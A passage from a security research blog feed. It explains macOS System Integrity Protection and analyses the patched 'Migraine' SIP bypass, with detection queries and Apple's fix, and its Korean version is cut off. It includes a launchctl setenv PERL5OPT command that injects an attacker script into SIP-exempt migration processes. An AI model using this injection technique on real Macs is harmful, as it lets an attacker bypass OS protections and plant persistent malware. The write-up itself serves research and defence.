of DTrace (a debugging and tracing tool)</td></tr><tr><td><code>CSR_ALLOW_UNRESTRICTED_NVRAM</code></td><td>Lifts read/write restrictions on NVRAM variables</td></tr><tr><td><code>CSR_ALLOW_UNAUTHENTICATED_ROOT</code></td><td>Allows booting from unsigned APFS root snapshots</td></tr></tbody></table></div><p>These flags can be enabled in special cases, such as for debugging or security research, but in a standard environment, all of them are disabled (set to 0) by default.</p><p>If you want to check the current SIP status on your macOS system, you can use the following command:</p><pre><code class="hljs bash">$ csrutil statusSystem Integrity Protection status: enabled.</code></pre><ul><li><strong>enabled</strong>: SIP is enabled and the default protections are in place.</li><li><strong>disabled</strong>: SIP is disabled.</li></ul><p>On Intel-based Macs, since SIP settings are stored in NVRAM variables, you can use the following command:</p><pre><code class="hljs bash">$ nvram csr-active-configcsr-active-config  w%00%00%00</code></pre><p>This value is a <strong>hexadecimal bitflag</strong> that indicates which SIP features are disabled. For example, a value of 0x77 means that multiple SIP protections have been turned off.</p><p>On Apple Silicon Macs, SIP settings are read from the Device Tree (lp-sip0), so the above command will not return this information.</p><h2 id="SIP-Bypass-Example"><a href="#SIP-Bypass-Example" class="headerlink" title="SIP Bypass Example"></a>SIP Bypass Example</h2><p>Let&#x2019;s analyze the drop_sip binary, which uses the com.apple.rootless.install.heritable entitlement, to see how it bypasses SIP.</p><pre><code class="hljs bash">DeviceProcessEvents| <span class="hljs-built_in">where</span> FileName =~ <span class="hljs-string">&quot;drop_sip&quot;</span>| project InitiatingProcessFileName, ProcessCommandLine, SHA256</code></pre><p>drop_sip is a binary <strong>signed directly by Apple</strong>.</p><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_en/image1.png" alt="image.png"></p><p>This binary is a signed executable that is <strong>natively located at</strong></p><p><code>/System/Library/PrivateFrameworks/SystemMigrationUtils.framework/Resources/Tools/drop_sip.</code></p><p>The binary <strong>uses csops() to configure SIP-related flags and spawn child processes</strong> with those settings.</p><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_en/image2.png" alt="image.png"></p><p>Through the <code>csops</code> system call, the <code>p_csflags</code> member is modified, effectively enabling or configuring SIP behavior.</p><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_en/image3.png" alt="image.png"></p><p>The parent process was <code>systemmigrationd</code>, which <strong>inherited the SIP bypass permission through</strong> <code>com.apple.rootless.install.heritable</code> and passed it down to its child processes. As a result, drop_sip and its child processes were executed in an environment where SIP protections could be bypassed.</p><pre><code class="hljs bash">DeviceProcessEvents| <span class="hljs-built_in">where</span> InitiatingProcessFileName =~ <span class="hljs-string">&quot;systemmigrationd&quot;</span>| summarize Hits=count(), Cmdline=any(ProcessCommandLine) by FileName</code></pre><p>Using the query above, we tracked the child processes of systemmigrationd.</p><p>During this investigation, we discovered that <strong>the Bash and Perl interpreters</strong> (/bin/bash and /usr/bin/perl) were being executed as child processes.<br>This was a significant clue, because <strong>interpreters can be exploited for code injection via environment variable manipulation</strong>.</p><div class="table-container"><table><thead><tr><th><strong>FileName</strong></th><th><strong>Hits</strong></th><th><strong>Cmdline</strong></th></tr></thead><tbody><tr><td>bash</td><td>498</td><td>/bin/bash /System/Library/&#x2026;/firstbootDirectoryServer</td></tr><tr><td>perl</td><td>171</td><td>/usr/bin/perl /usr/libexec/migrateLocalKDC &#x2026;</td></tr></tbody></table></div><p>By exploiting environment variables like BASH_ENV for Bash or PERL5OPT for Perl, an attacker can execute arbitrary shell scripts in child processes.</p><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_en/img_BASH_ENV.jpg" alt="image.png"><br>SIP Bypass Example Using BASH_ENV</p><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_en/img_PERL5OPT_ENV.jpg" alt="image.png"></p><p>SIP Bypass Example Using PERL5OPT</p><pre><code class="hljs bash">launchctl setenv PERL5OPT <span class="hljs-string">&apos;-Mwarnings;system(&quot;/private/tmp/migraine.sh&quot;)&apos;</span></code></pre><p>When such commands are executed, the script injected by the attacker (e.g., /private/tmp/migraine.sh) is run within a SIP-protected environment during Perl&#x2019;s startup.</p><hr><p>The SIP bypass vulnerability introduced earlier uses child processes of the <code>systemmigrationd</code> daemon as the attack entry point.<br>However, there&#x2019;s a catch &#x2014; <strong>this daemon is only active when a migration is actually triggered</strong>. Since typical migrations only occur <strong>after the user is fully logged out</strong>, it becomes <strong>difficult for a remote attacker to manipulate or automate this process in real-time</strong>.</p><p>Let&#x2019;s analyze the full migration flow to identify a <strong>bypass point that can be automated</strong>.</p><h3 id="Summary-of-the-Full-Migration-Flow"><a href="#Summary-of-the-Full-Migration-Flow" class="headerlink" title="Summary of the Full Migration Flow"></a>Summary of the Full Migration Flow</h3><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_en/flow.jpg" alt="image.png"></p><ol><li><strong>Migration Assistant</strong><br>This is the primary application that launches the migration wizard.<br>&#x2192; It triggers user logout and internally calls the <code>SACLOStartLogoutWithOptions</code> method.<br>&#x2192; This app has the <code>com.apple.private.mbsystemadministration</code> entitlement.</li><li><strong>MBSystemAdministration</strong><ul><li>Acts as a <strong>proxy</strong> for Migration Assistant, forwarding requests to the <strong>Setup Assistant</strong>.</li><li>It runs as the <code>_mbsetupuser</code>, enabling GUI interaction.</li><li>Communication occurs via XPC, and requests are <strong>rejected</strong> if the appropriate entitlement is missing.</li></ul></li><li><strong>Setup Assistant</strong><ul><li>Executes the actual migration logic and communicates with <code>systemmigrationd</code>.</li><li>Requires the <code>com.apple.private.systemmigration.daemonclient</code> entitlement.</li><li>Requests are sent via <strong>XPC</strong>.</li></ul></li><li><strong>systemmigrationd</strong><ul><li>Receives migration requests and processes them using the <strong>SystemMigration.framework</strong>.</li><li>Creates a migration request file in <code>/Library/SystemMigration/Queue</code> and transitions it to an <strong>&#x201C;In-Flight&#x201D;</strong>state for processing.</li><li>During this process, <strong>Bash or Perl scripts may be executed</strong> &#x2014; <strong>this is the point where an attacker can inject environment variable&#x2013;based payloads</strong>.</li></ul></li></ol><p>As we&#x2019;ve seen, during the migration process, <code>systemmigrationd</code> receives XPC requests internally through the <code>SystemMigrationDaemon</code> object provided by <code>SystemMigration.framework</code> .</p><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_en/image4.png" alt="image.png"></p><pre><code class="hljs bash">rax = [SystemMigrationDaemon sharedDaemon];[rax startListeningForConnections];</code></pre><p>The daemon receives client requests through its own framework and executes migration scripts (such as Bash or Perl) accordingly.</p><h3 id="Attempt-to-Patch-Migration-Assistant"><a href="#Attempt-to-Patch-Migration-Assistant" class="headerlink" title="Attempt to Patch Migration Assistant"></a>Attempt to Patch Migration Assistant</h3><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_en/image5.png" alt="image.png"></p><p>To automate the SIP bypass, Microsoft attempted to remove the function <code>SACLOStartLogoutWithOptions()</code>, which is responsible for triggering user logout during the migration process.</p><p>The idea was that bypassing this function might allow migration to proceed <strong>without requiring the user to log out</strong>. However, the attempt failed for three key reasons:</p><ol><li><strong>Code Signing Failure</strong><br>macOS enforces strict validation of system binary code signatures.<br>As soon as a binary is modified, its signature becomes invalid, and the system blocks its execution.</li><li><strong>PAC (Pointer Authentication Code) Validation Failure</strong><br>On modern Apple Silicon (macOS arm64e), <strong>PAC is enabled by default</strong>. Unsigned or tampered binaries <strong>fail PAC verification and cannot be executed</strong>.</li><li><strong>Loss of Entitlements</strong><br>The Migration Assistant binary requires the <code>com.apple.private.mbsystemadministration</code> entitlement in order to <strong>communicate with MBSystemAdministration via XPC</strong>.<br>However, during extraction, modification, and repackaging, this entitlement is <strong>lost</strong>, resulting in communication failure.</li></ol><p>As a result, simply removing the logout logic or modifying the Migration Assistant binary was <strong>not a viable solution</strong>.</p><p>Instead, based on the insights gained from this attempt, an alternative bypass was explored: directly launching the Setup Assistant and automating the process using AppleScript and environment variable&#x2013;based payload injection.</p><p>This approach enables an attacker to <strong>trigger</strong> <code>systemmigrationd</code> <strong>and inject payloads at the point where Bash/Perl scripts are executed&#x2014;without requiring user logout or interaction</strong>.</p><h2 id="Apple&#x2019;s-Response"><a href="#Apple&#x2019;s-Response" class="headerlink" title="Apple&#x2019;s Response"></a>Apple&#x2019;s Response</h2><p>Upon identifying the above vulnerability, Apple implemented two key mitigations:</p><ol><li><strong>Blocked environment variable inheritance in launchd</strong><br>Previously, an attacker could use the launchctl setenv command to set environment variables such as BASH_ENVor PERL5OPT, which would then be inherited by systemmigrationd child processes, allowing malicious code execution.<br>Apple mitigated this by <strong>modifying launchd to ignore these environment variables entirely</strong>, effectively blocking this attack vector.</li></ol><pre><code class="hljs bash">launchctl setenv WHATEVER blah<span class="hljs-comment"># error:</span>Could not <span class="hljs-built_in">set</span> environment: 150: Operation not permitted <span class="hljs-keyword">while</span> System Integrity Protection is engaged</code></pre><ol><li>Removed SIP bypass capabilities from within drop_sip</li></ol><h2 id="In-Conclusion"><a href="#In-Conclusion" class="headerlink" title="In Conclusion"></a><strong>In Conclusion</strong></h2><p>In this post, we explored a wide range of topics &#x2014; from the concept of SIP to entitlements, bypass techniques, practical exploitation, and Apple&#x2019;s patch response.</p><p>In the next research post, we&#x2019;ll return with a deep dive into <strong>Sandbox Escape</strong>. Stay tuned!</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://powerofcommunity.net/poc2024/Csaba%20Fitzl,%20Apple%20Disk-O%20Party.pdf">https://powerofcommunity.net/poc2024/Csaba%20Fitzl,%20Apple%20Disk-O%20Party.pdf</a></p><p><a href="https://github.com/LearningKijo/SecurityResearcher-Note/blob/main/SecurityResearcher-Note-Folder/Day14-macOS-SIP-Bypass-Insights.md">https://github.com/LearningKijo/SecurityResearcher-Note/blob/main/SecurityResearcher-Note-Folder/Day14-macOS-SIP-Bypass-Insights.md</a></p><p><a href="https://www.youtube.com/watch?v=zxZesAN-TEk">https://www.youtube.com/watch?v=zxZesAN-TEk</a></p><p><a href="https://www.offsec.com/blog/macos-kernel-debugging-with-sip/">https://www.offsec.com/blog/macos-kernel-debugging-with-sip/</a></p><p><a href="https://objective-see.org/blog/blog_0x14.html">https://objective-see.org/blog/blog_0x14.html</a></p><p><a href="https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/">https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/</a></p><p><a href="https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/Jonathan%20Bar%20Or%20Michael%20Pearse%20Anurag%20Bohra%20-%20Getting%20a%20Migraine%20-%20uncovering%20a%20unique%20SIP%20bypass%20on%20macOS.pdf">https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/Jonathan%20Bar%20Or%20Michael%20Pearse%20Anurag%20Bohra%20-%20Getting%20a%20Migraine%20-%20uncovering%20a%20unique%20SIP%20bypass%20on%20macOS.pdf</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/TCC-Bypass/">TCC Bypass</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] macOS: Part1 - SIP Bypass (ko)</title>
      <link>https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_ko/</link>
      <guid>https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_ko/</guid>
      <pubDate>Sun, 11 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/&quot;&gt;macOS: Part0 - TCC Bypass&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;macOS: Part1 - SIP Bypa</description>
        
      
      
      
      <content:encoded><![CDATA[<p><a href="https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/">macOS: Part0 - TCC Bypass</a></p><p>macOS: Part1 - SIP Bypass &#x2190; Now!</p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, clalxk&#xC785;&#xB2C8;&#xB2E4;! TCC Bypass&#xC5D0; &#xC774;&#xC5B4; SIP Bypass&#xC5D0; &#xB300;&#xD574; &#xC815;&#xB9AC;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC55E;&#xC73C;&#xB85C; macOS&#xC5D0;&#xC11C; &#xC8FC;&#xB85C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;! Part2&#xB3C4; &#xAE30;&#xB300;&#xD574;&#xC8FC;&#xC138;&#xC694; &#x314E;&#x314E; </p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; SIP&#xC758; &#xAC1C;&#xB150;&#xACFC; SIP Bypass &#xC608;&#xC81C;&#xB97C; &#xD1B5;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC804;&#xBC18;&#xC801;&#xC778; &#xD750;&#xB984;&#xACFC; &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Entitlement&#xAC00; &#xBB34;&#xC5C7;&#xC778;&#xC9C0; &#xC5B4;&#xB5A4; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xC9C0; &#xB4F1;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xB824; &#xD569;&#xB2C8;&#xB2E4;. </p><hr><h2 id="System-Integrity-Protection-SIP"><a href="#System-Integrity-Protection-SIP" class="headerlink" title="System Integrity Protection, SIP"></a>System Integrity Protection, SIP</h2><p>SIP&#xB294; &#xB8E8;&#xD2B8; &#xC0AC;&#xC6A9;&#xC790;&#xC870;&#xCC28; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xD575;&#xC2EC; &#xD30C;&#xC77C;&#xC744; &#xC218;&#xC815;&#xD558;&#xAC70;&#xB098; &#xC0AD;&#xC81C;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xC81C;&#xD55C;&#xD558;&#xB294; macOS&#xC758; &#xD575;&#xC2EC; &#xBCF4;&#xC548; &#xAE30;&#xB2A5;&#xC785;&#xB2C8;&#xB2E4;. Apple &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xC804;&#xCCB4; &#xD50C;&#xB7AB;&#xD3FC;&#xC744; &#xBCF4;&#xD638;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xB8E8;&#xD2B8;&#xB85C;&#xBD80;&#xD130; &#xBCF4;&#xD638;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC785;&#xB2C8;&#xB2E4;. (SELinux&#xAC00; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xBCF4;&#xD638;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xACFC; &#xAC1C;&#xB150;&#xC801;&#xC73C;&#xB85C; &#xC720;&#xC0AC;) </p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xBA74; &#xACF5;&#xACA9;&#xC790;&#xB294; SIP&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xACE0;, &#xC2DC;&#xC2A4;&#xD15C; &#xBCF4;&#xD638; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD574; &#xB8E8;&#xD2B8;&#xD0B7; &#xC124;&#xCE58;, TCC &#xC6B0;&#xD68C;, &#xC9C0;&#xC18D;&#xD615; &#xBA40;&#xC6E8;&#xC5B4; &#xC0DD;&#xC131;&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xB2E4;&#xC591;&#xD55C; &#xC545;&#xC131; &#xD589;&#xC704;&#xB97C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. SIP&#xAC00; &#xC801;&#xC6A9;&#xB41C; &#xC2DC;&#xC2A4;&#xD15C;&#xC740; &#xC2DC;&#xC2A4;&#xD15C; &#xD30C;&#xC77C; &#xBC0F; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC5C6;&#xC73C;&#xBA70;, &#xC2EC;&#xC9C0;&#xC5B4; root &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xB354;&#xB77C;&#xB3C4; &#xC774;&#xB7EC;&#xD55C; &#xAD8C;&#xD55C;&#xC774; &#xC81C;&#xD55C;&#xB418;&#xC5B4; &#x2018;<strong>rootless</strong>&#x2019;&#xB77C;&#xACE0;&#xB3C4; &#xBD88;&#xB9BD;&#xB2C8;&#xB2E4;.</p><h3 id="SIP&#xC640;-Entitlement&#xC758;-&#xAD00;&#xACC4;"><a href="#SIP&#xC640;-Entitlement&#xC758;-&#xAD00;&#xACC4;" class="headerlink" title="SIP&#xC640; Entitlement&#xC758; &#xAD00;&#xACC4;"></a>SIP&#xC640; Entitlement&#xC758; &#xAD00;&#xACC4;</h3><p>SIP&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xACBD;&#xB85C;&#xB97C; &#xBCF4;&#xD638;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>/System, /bin, /sbin, /usr(&#xC77C;&#xBD80; &#xC81C;&#xC678;)</li><li>&#xC2DC;&#xC2A4;&#xD15C; &#xCEE4;&#xB110; &#xBC0F; &#xD575;&#xC2EC; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;</li><li>SIP&#xAC00; &#xC124;&#xC815;&#xD55C; &#xC18D;&#xC131;&#xC774; &#xD3EC;&#xD568;&#xB41C; &#xD30C;&#xC77C;</li></ul><blockquote><p><em>SIP&#xB97C; &#xC644;&#xC804;&#xD788; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD558;&#xB824;&#xBA74; &#xBCF5;&#xAD6C; &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C;&#xB9CC; &#xC124;&#xC815; &#xBCC0;&#xACBD;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBA70;, &#xC77C;&#xBC18;&#xC801;&#xC778; &#xB7F0;&#xD0C0;&#xC784; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; &#xBD88;&#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</em></p></blockquote><p>&#xADF8;&#xB7EC;&#xB098; &#xC2DC;&#xC2A4;&#xD15C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xB4F1;&#xC5D0;&#xB294; SIP&#xB85C; &#xBCF4;&#xD638;&#xB418;&#xB294; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD574;&#xC57C;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC608;&#xC678;&#xC801;&#xC73C;&#xB85C; SIP&#xC758; &#xC81C;&#xD55C;&#xC744; &#xBC1B;&#xC9C0; &#xC54A;&#xB294; &#xD2B9;&#xC815; &#xAD8C;&#xD55C;&#xC744; &#xB3C4;&#xC785;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xAD8C;&#xD55C;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ul><li>com.apple.rootless.install : SIP &#xD30C;&#xC77C;&#xC2DC;&#xC2A4;&#xD15C; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xAD8C;&#xD55C;</li><li>com.apple.rootless.install.heritable : &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; com.apple.rootless.install &#xC0C1;&#xC18D;</li></ul><p>&#xD2B9;&#xC815; &#xD30C;&#xC77C; &#xD639;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC5B4;&#xB5A0;&#xD55C; &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD558;&#xB294; &#xAC83;&#xC744; &#x201C;<a href="https://developer.apple.com/documentation/bundleresources/entitlements"><strong>Entitlement</strong></a>&#x201D;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. Entitlement&#xB294; &#xC571; &#xC11C;&#xBA85; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD569;&#xBC95;&#xC801;&#xC73C;&#xB85C; &#xC704;&#xC870;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. Apple&#xC740; macOS&#xC5D0;&#xC11C; &#xBCF4;&#xC548;&#xC744; &#xAC15;&#xD654;&#xD558;&#xAE30; &#xC704;&#xD574; Entitlement&#xB97C; &#xAD11;&#xBC94;&#xC704;&#xD558;&#xAC8C; &#xC0AC;&#xC6A9;&#xD558;&#xBA70;, &#xB9E4;&#xC6B0; &#xAD6C;&#xCCB4;&#xC801;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xB0B4;&#xBD80; &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD569;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xC704;&#xC5D0;&#xC11C; &#xC5B8;&#xAE09;&#xB41C;  <code>com.apple.rootless.install.heritable</code>&#xB294; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xBFD0; &#xC544;&#xB2C8;&#xB77C; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; <code>com.apple.rootless.install</code>&#xC744; &#xC0C1;&#xC18D;&#xD558;&#xC5EC; SIP &#xD30C;&#xC77C;&#xC2DC;&#xC2A4;&#xD15C; &#xBCF4;&#xD638;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC870;&#xAE08; &#xD6C4;&#xC5D0; &#xC774; Entitlement&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC6B0;&#xD68C;&#xD588;&#xB294;&#xC9C0; &#xC608;&#xC81C;&#xB97C; &#xD1B5;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! </p><h3 id="SIP-&#xC124;&#xC815;-&#xC800;&#xC7A5;-&#xC704;&#xCE58;"><a href="#SIP-&#xC124;&#xC815;-&#xC800;&#xC7A5;-&#xC704;&#xCE58;" class="headerlink" title="SIP &#xC124;&#xC815; &#xC800;&#xC7A5; &#xC704;&#xCE58;"></a>SIP &#xC124;&#xC815; &#xC800;&#xC7A5; &#xC704;&#xCE58;</h3><p>SIP&#xC758; &#xD65C;&#xC131;&#xD654; &#xBC0F; &#xC138;&#xBD80; &#xD5C8;&#xC6A9; &#xC0AC;&#xD56D;&#xC740; <strong>bitflag</strong> &#xD615;&#xD0DC;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><ul><li><strong>Intel Mac</strong>&#xC5D0;&#xC11C;&#xB294; NVRAM&#xC758; <code>csr-active-config</code> &#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;</li><li><strong>Apple Silicon (ARM) Mac</strong>&#xC5D0;&#xC11C;&#xB294; &#xBD80;&#xD305; &#xC2DC; Device Tree&#xC5D0;&#xC11C; <code>lp-sip0</code> &#xAC12;&#xC744; &#xC77D;&#xC5B4; &#xAD6C;&#xC131;</li></ul><p>&#xC989;, &#xD50C;&#xB7AB;&#xD3FC;&#xC5D0; &#xB530;&#xB77C; SIP &#xC124;&#xC815;&#xC744; &#xC77D;&#xB294; &#xACBD;&#xB85C;&#xAC00; &#xB2E4;&#xB985;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xBE44;&#xD2B8; &#xD50C;&#xB798;&#xADF8;&#xB4E4;&#xC740; <strong>XNU &#xCEE4;&#xB110; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xC758; csr.h</strong> &#xD5E4;&#xB354; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>*XNU&#xB294; macOS&#xC640; iOS&#xC758; &#xCEE4;&#xB110;&#xB85C;, Apple&#xC774; &#xAC1C;&#xBC1C;&#xD55C; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xAE30;&#xBC18;&#xC758; &#xC6B4;&#xC601;&#xCCB4;&#xC81C; &#xCEE4;&#xB110;&#xC785;&#xB2C8;&#xB2E4;.</p></blockquote><h3 id="SIP-&#xBE44;&#xD2B8;&#xD50C;&#xB798;&#xADF8;-&#xBAA9;&#xB85D;"><a href="#SIP-&#xBE44;&#xD2B8;&#xD50C;&#xB798;&#xADF8;-&#xBAA9;&#xB85D;" class="headerlink" title="SIP &#xBE44;&#xD2B8;&#xD50C;&#xB798;&#xADF8; &#xBAA9;&#xB85D;"></a>SIP &#xBE44;&#xD2B8;&#xD50C;&#xB798;&#xADF8; &#xBAA9;&#xB85D;</h3><p>&#xC2AC;&#xB77C;&#xC774;&#xB4DC; &#xD558;&#xB2E8;&#xC758; &#xD45C;&#xB294; &#xC2E4;&#xC81C; SIP &#xAE30;&#xB2A5; &#xC81C;&#xC5B4;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC8FC;&#xC694; &#xD50C;&#xB798;&#xADF8;&#xB4E4;&#xC785;&#xB2C8;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th><strong>Bit &#xC774;&#xB984; (XNU &#xCF54;&#xB4DC; &#xC0C1;)</strong></th><th><strong>&#xAE30;&#xB2A5; &#xC124;&#xBA85;</strong></th></tr></thead><tbody><tr><td>CSR_ALLOW_UNTRUSTED_KEXTS</td><td>&#xC11C;&#xBA85;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xCEE4;&#xB110; &#xD655;&#xC7A5;(KEXT) &#xB85C;&#xB529; &#xD5C8;&#xC6A9;</td></tr><tr><td>CSR_ALLOW_UNRESTRICTED_FS</td><td>&#xBCF4;&#xD638;&#xB41C; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xACBD;&#xB85C;&#xC5D0; &#xB300;&#xD55C; &#xBB34;&#xC81C;&#xD55C; &#xC811;&#xADFC; &#xD5C8;&#xC6A9;</td></tr><tr><td>CSR_ALLOW_TASK_FOR_PID</td><td>&#xD2B9;&#xC815; PID&#xC5D0; &#xB300;&#xD55C; task &#xD3EC;&#xD2B8;(&#xB514;&#xBC84;&#xAE45; &#xC6A9;&#xB3C4;) &#xC811;&#xADFC; &#xD5C8;&#xC6A9;</td></tr><tr><td>CSR_ALLOW_KERNEL_DEBUGGER</td><td>&#xCEE4;&#xB110; &#xB514;&#xBC84;&#xAE45; &#xD65C;&#xC131;&#xD654; &#xD5C8;&#xC6A9;</td></tr><tr><td>CSR_ALLOW_UNRESTRICTED_DTRACE</td><td>DTrace(&#xB514;&#xBC84;&#xAE45; &#xBC0F; &#xD2B8;&#xB808;&#xC774;&#xC2F1; &#xB3C4;&#xAD6C;)&#xC758; &#xBB34;&#xC81C;&#xD55C; &#xC0AC;&#xC6A9; &#xD5C8;&#xC6A9;</td></tr><tr><td>CSR_ALLOW_UNRESTRICTED_NVRAM</td><td>NVRAM &#xBCC0;&#xC218;&#xC758; &#xC77D;&#xAE30;&#xB7;&#xC4F0;&#xAE30; &#xC81C;&#xD55C; &#xD574;&#xC81C;</td></tr><tr><td>CSR_ALLOW_UNAUTHENTICATED_ROOT</td><td>&#xC11C;&#xBA85;&#xB418;&#xC9C0; &#xC54A;&#xC740; APFS &#xB8E8;&#xD2B8; &#xC2A4;&#xB0C5;&#xC0F7; &#xBD80;&#xD305; &#xD5C8;&#xC6A9;</td></tr></tbody></table></div><p>&#xC774;&#xB7EC;&#xD55C; &#xD50C;&#xB798;&#xADF8;&#xB294; &#xBCF4;&#xC548;&#xC744; &#xBB34;&#xB825;&#xD654;&#xD558;&#xAC70;&#xB098; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC704;&#xD574; &#xD2B9;&#xBCC4;&#xD55C; &#xC0C1;&#xD669;&#xC5D0;&#xC11C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC;, &#xC77C;&#xBC18;&#xC801;&#xC778; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBAA8;&#xB450; &#xBE44;&#xD65C;&#xC131;&#xD654; &#xC0C1;&#xD0DC;(0)&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xD604; macOS 